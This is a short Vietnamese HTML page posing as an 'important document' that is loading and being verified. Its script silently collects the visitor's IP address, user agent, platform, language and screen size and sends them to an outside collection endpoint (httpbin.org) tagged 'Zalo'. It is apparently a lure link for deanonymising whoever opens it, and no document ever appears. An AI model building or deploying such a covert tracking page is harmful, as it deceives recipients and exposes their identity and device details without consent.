<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tài liệu quan trọng</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding: 60px; 
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
        }
        .box { 
            background: white; 
            color: #333; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            max-width: 600px; 
            margin: 0 auto;
        }
        h2 { color: #e74c3c; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Đang tải tài liệu...</h2>
        <p>Vui lòng chờ trong vài giây để hệ thống xác thực.</p>
        <p id="ip" style="margin-top:20px; font-size:18px;"></p>
    </div>

    <script>
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                const ip = data.ip;
                document.getElementById('ip').innerHTML = `
                    <strong>IP của bạn: ${ip}</strong><br>
                    <small>Đang xử lý thông tin...</small>
                `;

                // Gửi log chi tiết
                fetch('https://httpbin.org/post', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ip: ip,
                        time: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screen: screen.width + 'x' + screen.height,
                        source: "Zalo"
                    })
                }).catch(() => {});
            })
            .catch(() => {
                document.getElementById('ip').innerHTML = "Đang xử lý...";
            });
    </script>
</body>
</html>
